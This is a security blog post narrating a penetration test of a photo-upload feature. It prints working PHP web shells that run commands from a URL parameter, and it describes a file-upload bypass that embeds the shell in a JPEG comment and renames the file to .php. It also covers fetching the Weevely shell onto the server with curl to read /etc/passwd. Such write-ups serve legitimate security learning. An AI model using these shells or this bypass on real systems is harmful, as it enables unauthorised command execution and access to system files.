<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="utf-8">
      <meta name="description" content=Giovanni Cattani's Blog>
      <meta name="author" content=Giovanni Cattani>
      <meta name="viewport" content="width=device-width">
      <link rel="stylesheet" href="/css/syntax.css">
      <link rel="stylesheet" href="/css/main.css">
      <link rel="stylesheet" href="/css/normalize.css">
      <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
      <link rel="icon" href="/favicon.ico" type="image/x-icon">
      <link rel="alternate" type="application/atom+xml" href="/atom.xml">
      <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
      <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
      <script>
   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
   (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
   m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
   })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

   ga('create', 'UA-39540268-1', 'gcattani.co.vu');
   ga('send', 'pageview');
</script>

      <title>A Tale of a PHP Shell</title>
   </head>
   
   <body>
      <main>
         <header>
            <h1 class="title"><a href="/">BoringSec</a></h1>
         </header>

         <article>
   <h2>A Tale of a PHP Shell</h2>
   <hr>
   <p>During a penetration test where I had only a single day to get the most out of a web application, a photo upload feature caught my attention. By the time I got to the upload page, I already discovered that all the photos were uploaded to a specific directory for each authenticated user:</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">http://example.com/attachments/[USERID]/
</code></pre></div>
<p>I knew where my uploaded files will be put, now it was time to get a shell up and working! I started with a very basic shell, which I usually employ as a starting point:</p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>

<p>First of all, I tried uploading a .php file directly, just to test my daily luck. Without much surprise, the application only accepted JPEG files.</p>

<p>Next, I tried adding the .jpg extension to my file, relying on the usual tricks as <code>shell.php.jpg</code>, <code>shell.jpg</code>, <code>shell.php%00.jpg</code> etc. None of them went through.</p>

<p>The only remaining solution seemed to insert the shell code into the JPEG comment, as the application apperared to accept only proper image files. It worked!</p>

<p>Jumping right into the newly uploaded shell, I quickly discover that the .jpg file wasn&#39;t being executed by the server, leaving me with a useless commented picture.</p>

<p>To test the security mechanisms further, I tried renaming the JPEG into .php and this time the upload completed successfully. The application was only checking for the file to be a proper JPEG, regardless of the extension!</p>

<p>Getting back to my shell, I am greeted by an error message stating that <code>system()</code> is disabled and couldn&#39;t be used to execute commands. My chances were getting thin as I figured most of the functions must have been disabled. In order to check which functions I could still use, I uploaded the following code:</p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span> <span class="k">echo</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;disable_functions&quot;</span><span class="p">);</span> <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>

<p>Despite my basic knowledge of the PHP language, I immediately noticed that the returned list was not including the <code>exec()</code> function. The updated shell now looked like:</p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>

<p>To my dismay, while not returning any error messages, the shell was returning only one-line responses (e.g. <code>whoami</code> worked, <code>ls</code> didn&#39;t). Utterly annoyed, I went back to the <code>exec()</code> guide and noticed that I got it all wrong! To properly address the output issue, the shell evolved into:</p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">],</span> <span class="nv">$o</span><span class="p">,</span> <span class="nv">$r</span><span class="p">);</span> <span class="k">print</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$o</span><span class="p">);</span> <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>

<p>Once more, I inserted the code into a JPG comment and renamed it to shell.php. This time the uploaded shell was finally working properly! The shell could be used via the <code>cmd</code> parameter in order to execute commands directly onto the server.</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">http://example.com/attachments/12345/shell.php?cmd=whoami
</code></pre></div>
<p>At this point, I was able to browse and operate on the whole web root, but <em>mod_security</em> was forbidding me more interesting actions, like executing <code>cat /etc/password</code>. Not completely satisfied with the result, I checked the available applications and noticed that <code>curl</code> was available...</p>

<p>Time was running out and I decided to try out <a href="https://github.com/epinna/Weevely">Weevely</a>, an (amazing) interactive shell that can be controlled from the terminal. Using Dropbox and <code>curl</code> I was able to directly download Weevely on the remote server and the new shell was able to read /etc/passwd and return other interesting PHP configuration information, like the list of available functions.</p>

</article>

<footer>
   <div id="date" class="meta">
      13 Mar 2013
   </div>
   <div id="return">
      <a href="/">&laquo; Home Page</a>
   </div>
   <br>
</footer>

      </main>
   </body>
</html>
